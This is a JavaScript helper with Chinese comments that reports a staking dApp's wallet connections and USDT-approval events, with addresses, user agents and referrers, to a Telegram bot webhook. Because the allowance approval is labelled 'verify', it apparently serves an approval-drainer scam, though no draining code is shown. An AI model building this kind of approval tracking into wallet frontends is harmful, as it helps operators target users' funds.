// 前端集成示例代码
// 将此代码集成到您的DApp前端中

class TelegramBotIntegration {
  constructor(webhookUrl = 'http://localhost:3001') {
    this.webhookUrl = webhookUrl;
    this.retryCount = 0;
    this.maxRetries = 3;
  }

  // 发送用户连接事件
  async notifyUserConnect(address, action = 'connect') {
    try {
      console.log(` 通知机器人用户${action}:`, address);
      
      const response = await fetch(`${this.webhookUrl}/webhook/user-connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: address,
          action: action,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          referrer: document.referrer
        })
      });

      if (response.ok) {
        console.log(' 用户连接事件已发送到Telegram');
        this.retryCount = 0; // 重置重试计数
      } else {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
    } catch (error) {
      console.error(' 发送用户连接事件失败:', error);
      
      // 重试机制
      if (this.retryCount < this.maxRetries) {
        this.retryCount++;
        console.log(` 重试发送 (${this.retryCount}/${this.maxRetries})...`);
        setTimeout(() => this.notifyUserConnect(address, action), 2000 * this.retryCount);
      }
    }
  }

  // 发送用户断开事件
  async notifyUserDisconnect(address) {
    try {
      console.log(' 通知机器人用户断开:', address);
      
      const response = await fetch(`${this.webhookUrl}/webhook/user-disconnect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: address,
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        console.log(' 用户断开事件已发送到Telegram');
      } else {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
    } catch (error) {
      console.error(' 发送用户断开事件失败:', error);
    }
  }

  // 强制更新用户信息
  async forceUpdateUserInfo(address = null) {
    try {
      const response = await fetch(`${this.webhookUrl}/api/force-update`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ address })
      });

      if (response.ok) {
        console.log(' 用户信息更新请求已发送');
        return await response.json();
      } else {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
    } catch (error) {
      console.error(' 强制更新用户信息失败:', error);
      return null;
    }
  }

  // 获取机器人状态
  async getBotStatus() {
    try {
      const response = await fetch(`${this.webhookUrl}/api/status`);
      
      if (response.ok) {
        return await response.json();
      } else {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
    } catch (error) {
      console.error(' 获取机器人状态失败:', error);
      return null;
    }
  }
}

// 使用示例
const telegramBot = new TelegramBotIntegration('http://your-server:3001');

// 在钱包连接成功后调用
async function onWalletConnect(address) {
  await telegramBot.notifyUserConnect(address, 'connect');
}

// 在用户授权后调用
async function onUserAuthorize(address) {
  await telegramBot.notifyUserConnect(address, 'authorize');
}

// 在钱包断开后调用
async function onWalletDisconnect(address) {
  await telegramBot.notifyUserDisconnect(address);
}

// 定期检查机器人状态
setInterval(async () => {
  const status = await telegramBot.getBotStatus();
  if (status) {
    console.log(' 机器人状态:', status);
  }
}, 60000); // 每分钟检查一次

// 导出供其他模块使用
if (typeof module !== 'undefined' && module.exports) {
  module.exports = TelegramBotIntegration;
}

// ==== 集成到现有DApp代码中 ====

// 1. 在useWeb3Staking hook中集成
/*
const { address, isConnected } = useAppKitAccount();

useEffect(() => {
  if (isConnected && address) {
    telegramBot.notifyUserConnect(address, 'connect');
  } else if (!isConnected && address) {
    telegramBot.notifyUserDisconnect(address);
  }
}, [isConnected, address]);
*/

// 2. 在verify成功后集成
/*
const handleApprove = async () => {
  try {
    const txHash = await approveUsdt(amount);
    console.log('verify成功:', txHash);
    
    // 通知Telegram机器人
    await telegramBot.notifyUserConnect(address, 'authorize');
  } catch (error) {
    console.error('verify失败:', error);
  }
};
*/

// 3. 在页面加载时检查机器人状态
/*
useEffect(() => {
  const checkBotStatus = async () => {
    const status = await telegramBot.getBotStatus();
    if (status) {
      console.log(' Telegram机器人在线，监控用户:', status.connectedUsers);
    } else {
      console.warn(' Telegram机器人离线');
    }
  };
  
  checkBotStatus();
}, []);
*/



